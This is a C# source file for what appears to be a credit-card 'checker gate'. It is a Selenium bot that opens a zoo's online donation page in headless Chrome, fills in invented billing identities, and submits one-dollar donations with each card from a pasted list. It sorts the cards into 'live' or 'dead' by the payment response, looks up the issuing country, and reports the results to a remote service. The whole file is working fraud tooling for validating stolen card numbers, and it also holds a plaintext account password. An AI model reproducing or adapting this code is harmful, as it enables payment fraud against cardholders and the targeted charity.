using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Zoo
    {
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string cc2 = "";
        private readonly Random _random = new Random();

        check check = new check();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {
                try
                {



                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=true", "--incognito", "--headless");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;

                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.quitozoo.org/donaciones";
                    Thread.Sleep(2000);
                    Form1.circularProgressBar1.Value = 20;
                    correo = "hernanlopez5263" + getNum() + "@gmail.com";

                    var email = "vglldqvelsco@papayamailbox.com";
                    var pass = "..Danny..123";

                    Thread.Sleep(500);

                    if (tiempoElemento(By.Id("donation_amount_field")))
                    {
                        driver.ExecuteJavaScript("document.querySelector('#donation_amount_field').value='1.00'");
                        Thread.Sleep(1000);
                        driver.FindElementByXPath("/html/body/div[1]/div/div[1]/div/div/div[1]/div/div[2]/div/div/div/div/div[4]/form/button").Click();
                        Thread.Sleep(1000);
                        if (IsElementPresent(By.Id("billing_first_name")))
                        {
                            Form1.circularProgressBar1.Value = 60;
                            driver.FindElementById("billing_first_name").SendKeys("JOSE");
                            Thread.Sleep(500);
                            driver.FindElementById("billing_last_name").SendKeys("LOPEZ");
                            Thread.Sleep(500);
                            var country = new SelectElement(driver.FindElementById("billing_country"));
                            country.SelectByValue("US");
                            Thread.Sleep(500);
                            driver.FindElementById("billing_city").SendKeys("MIAMI");
                            Thread.Sleep(500);
                            driver.FindElementById("billing_phone").SendKeys("213675" + RandomNumber(1000, 9999));
                            Thread.Sleep(500);
                            driver.FindElementById("billing_email").SendKeys(correo);
                            Thread.Sleep(4000);
                            driver.FindElementByXPath("//*[@id='payment']/div/div/p/label/span[1]").Click();
                            Thread.Sleep(1000);
                            driver.FindElementById("place_order").Click();
                            Thread.Sleep(4000);

                            if (tiempoElemento(By.Id("document_type")))
                            {
                                Form1.circularProgressBar1.Value = 70;
                                Thread.Sleep(300);
                                var selectCed = new SelectElement(driver.FindElement(By.XPath("//*[@id='document_type']")));
                                Thread.Sleep(200);
                                selectCed.SelectByValue("PPN");
                                Thread.Sleep(200);

                                driver.FindElement(By.XPath("//*[@id='document']")).SendKeys("0504" + RandomNumber(600000000, 999999999).ToString());
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div[2]/div/div[2]/div/div/form/div[4]/div/div/div")).Click();
                                Thread.Sleep(2000);
                                                      
                                driver.FindElementByXPath("//*[@id='app']/div[2]/div/div/div[2]/div/div[2]/div/div/form/div[4]/div/div/div/ul/li[3]").Click();
                                Thread.Sleep(1000);
                                driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div[2]/div/div[2]/div/div/form/div[5]/button")).Click();
                                Thread.Sleep(2000);
                                if (tiempoElemento(By.Id("card_number")))
                                {
                                    pago();
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }

                }
                catch (Exception ex)
                {

                    restart();
                }

            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 1000)
                    {

                        Form1.circularProgressBar1.Value = 90;

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        Thread.Sleep(500);
                        cc2 = cc;





                        Thread.Sleep(1000);

                        if (tiempoElemento(By.Id("card_number")))
                        {

                        }
                        else
                        {
                            restart();
                        }

                        for (var i = 0; i <= ccnum.Length - 1; i++)
                        {
                            driver.FindElementByXPath("//*[@id='card_number']").SendKeys(ccnum[i].ToString());
                            Thread.Sleep(100);
                        }

                        Thread.Sleep(200);
                        driver.FindElementByXPath("//*[@id='card_expiration']").SendKeys(ccLine[1]);
                        Thread.Sleep(200);
                        driver.FindElementByXPath("//*[@id='card_expiration']").SendKeys(ccLine[2].Remove(0, 2));
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='card_cvv']")).SendKeys("000");
                        Thread.Sleep(200);

                        if (tiempoElemento(By.XPath("//*[@id='card_credit']")))
                        {
                            var select = new SelectElement(driver.FindElement(By.XPath("//*[@id='card_credit']")));
                            select.SelectByIndex(1);
                            Thread.Sleep(200);
                        }

                        driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div[2]/div/div[2]/div[1]/div[1]/div/div[2]/form/div[5]/button")).Click();
                        Thread.Sleep(5000);


                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        stop();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (IsElementPresent(By.XPath("//*[@id='email']")))
                {
                    pago();
                }
                else
                {
                    restart();
                }
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[1]")).Text.Trim() == "El pago ha sido rechazado" || driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[1]")).Text.Trim() == "El proceso de pago ha expirado")
                            {
                                if (IsElementPresent(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[2]")))
                                {                                    //*[@id="app"]/div[2]/div/div/div/div[2]/div[1]/div/div/div/p[2]
                                    if (driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[1]/div/p[2]")).Text.Trim() == "Negada, Acuda a su entidad")
                                    {
                                        estado = "dead";
                                    }
                                    else
                                    {
                                        estado = "dead";
                                    }
                                }

                                if (IsElementPresent(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div/div/p[2]")))
                                {                                    
                                    if (driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div/div/p[2]")).Text.Trim() == "El tiempo disponible para completar el pago ha caducado")
                                    {
                                        estado = "dead";
                                    }
                                }
                            }
                            else
                            {
                                estado = "live";
                            }
                        }
                    }


                }
                else
                {
                    estado = "error";
                }
                tiempo++;
            }

            if (estado == "dead")
            {
                driver.FindElement(By.XPath("//*[@id='app']/div[2]/div/div/div/div[2]/div[1]/div/div[3]/div/a")).Click();
                Thread.Sleep(1000);
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                Form1.circularProgressBar1.Value = 100;
                Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc2 + " - " + checkbin(cc2.Substring(0, 6)));
                Console.WriteLine("dead " + numeroTargeta + " - " + cc2 + " - " + correo + " - " + clave);
                Form1.textBox2.AppendText(Environment.NewLine);
                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc2.Length).Trim();
                numeroTargeta++;
                pagos++;
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

